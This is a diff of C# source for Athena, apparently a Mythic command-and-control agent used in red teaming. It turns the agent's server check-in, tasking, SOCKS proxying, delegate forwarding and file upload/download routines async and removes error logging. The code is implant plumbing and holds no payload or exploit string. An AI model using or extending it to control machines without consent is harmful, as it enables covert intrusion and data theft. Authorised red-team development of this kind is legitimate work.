@@ -25,7 +25,7 @@ namespace Athena
         /// <summary>
         /// Performa  check-in with the Mythic server
         /// </summary>
-        public CheckinResponse CheckIn()
+        public async Task<CheckinResponse> CheckIn()
         {
             Checkin ct = new Checkin()
             {
@@ -43,7 +43,7 @@ namespace Athena
 
             try
             {
-                var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
+                var responseString = await this.MythicConfig.currentConfig.Send(ct);
 
                 if (String.IsNullOrEmpty(responseString))
                 {
@@ -61,8 +61,6 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteError($"[CheckIn] {e.Message}");
-                Misc.WriteError(e.StackTrace);
                 return new CheckinResponse();
             }
         }
@@ -73,7 +71,7 @@ namespace Athena
         /// <param name="jobs">List of MythicJobs</param>
         /// <param name="delegateMessages">List of DelegateMessages</param>
         /// <param name="socksMessage">List of SocksMessages</param>
-        public List<MythicTask> GetTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
+        public async Task<List<MythicTask>> GetTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
         {
             List<ResponseResult> responseResults = GetResponses(jobs);
             GetTasking gt = new GetTasking()
@@ -94,12 +92,10 @@ namespace Athena
                     return null;
                 }
 
-                return HandleGetTaskingResponse(responseString);
+                return await HandleGetTaskingResponse(responseString);
             }
             catch (Exception e)
             {
-                Misc.WriteError($"[GetTasks] {e.Message}");
-                Misc.WriteError(e.StackTrace);
                 return null;
             }
         }
@@ -110,7 +106,7 @@ namespace Athena
         /// Parse the GetTaskingResponse and forward them to the required places
         /// </summary>
         /// <param name="responseString">Response from the Mythic server</param>
-        private static List<MythicTask> HandleGetTaskingResponse(string responseString)
+        private static async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
         {
             GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
             if (gtr is null)
@@ -118,7 +114,7 @@ namespace Athena
                 return null;
             }
 
-            if (gtr.delegates is not null)
+            if (gtr.delegates is not null && gtr.delegates.Count > 0)
             {
                 try
                 {
@@ -126,12 +122,11 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError($"[HandleGetTaskingResponse] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
+
                 }
             }
             //Pass up socks messages
-            if (gtr.socks is not null)
+            if (gtr.socks is not null && gtr.socks.Count > 0)
             {
                 try
                 {
@@ -139,8 +134,7 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError($"[HandleGetTaskingResponse2] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
+
                 }
             }
             if (gtr.responses is not null)
@@ -151,8 +145,6 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError($"[HandleGetTaskingResponse3] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
                 }
             }
             return gtr.tasks;
@@ -341,9 +333,7 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError($"[GetResponses] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
-                    Misc.WriteError(e.Message);
+
                 }
             }
             return lrr;
@@ -353,11 +343,11 @@ namespace Athena
         /// Handles SOCKS messages received from the Mythic server
         /// </summary>
         /// <param name="socks">List of SocksMessages</param>
-        private static void HandleSocks(List<SocksMessage> socks)
+        private static async Task HandleSocks(List<SocksMessage> socks)
         {
-            Parallel.ForEach(socks, s =>
+            Parallel.ForEach(socks, async sock =>
             {
-                Globals.socksHandler.HandleMessage(s);
+                await Globals.socksHandler.HandleMessage(sock);
             });
         }
 
@@ -365,30 +355,30 @@ namespace Athena
         /// Handle delegate messages received from the Mythic server
         /// </summary>
         /// <param name="delegates">List of DelegateMessages</param>
-        private static void HandleDelegates(List<DelegateMessage> delegates)
+        private static async Task HandleDelegates(List<DelegateMessage> delegates)
         {
-            foreach (var del in delegates)
+            Parallel.ForEach(delegates, async del =>
             {
-                Globals.mc.MythicConfig.forwarder.ForwardDelegateMessage(del);
-            }
+                await Globals.mc.MythicConfig.forwarder.ForwardDelegateMessage(del);
+            });
         }
 
         /// <summary>
         /// Handle response result messages received from the Mythic server
         /// </summary>
         /// <param name="responses">List of MythicResponseResults</param>
-        private static void HandleMythicResponses(List<MythicResponseResult> responses)
+        private static async Task HandleMythicResponses(List<MythicResponseResult> responses)
         {
             foreach(var response in responses)
             {
                 if (Globals.uploadJobs.ContainsKey(response.task_id))
                 {
-                    HandleUpload(response);
+                    await HandleUpload(response);
                 }
 
                 if (Globals.downloadJobs.ContainsKey(response.task_id))
                 {
-                    HandleDownload(response);
+                    await HandleDownload(response);
                 }
             }
         }
@@ -397,7 +387,7 @@ namespace Athena
         /// Handle file upload tasks received from the Mythic server
         /// </summary>
         /// <param name="response">MythicResponseResult containing the required inforamtion</param>
-        private static void HandleUpload(MythicResponseResult response)
+        private static async Task HandleUpload(MythicResponseResult response)
         {
             MythicUploadJob uploadJob = Globals.uploadJobs[response.task_id];
             MythicJob mythicJob = Globals.jobs[response.task_id];
@@ -431,7 +421,7 @@ namespace Athena
         /// Handle file download tasks received from the Mythic server
         /// </summary>
         /// <param name="response">MythicResponseResult containing the required inforamtion</param>
-        private static void HandleDownload(MythicResponseResult response)
+        private static async Task HandleDownload(MythicResponseResult response)
         {
             MythicDownloadJob downloadJob = Globals.downloadJobs[response.task_id];
             MythicJob mythicJob = Globals.jobs[response.task_id];
@@ -457,7 +447,7 @@ namespace Athena
                     if (downloadJob.chunk_num != downloadJob.total_chunks)
                     {
                         downloadJob.chunk_num++;
-                        mythicJob.taskresult = downloadJob.DownloadNextChunk();
+                        mythicJob.taskresult = await downloadJob.DownloadNextChunk();
                         mythicJob.errored = downloadJob.errored;
                         mythicJob.hasoutput = true;
                         mythicJob.complete = downloadJob.complete;
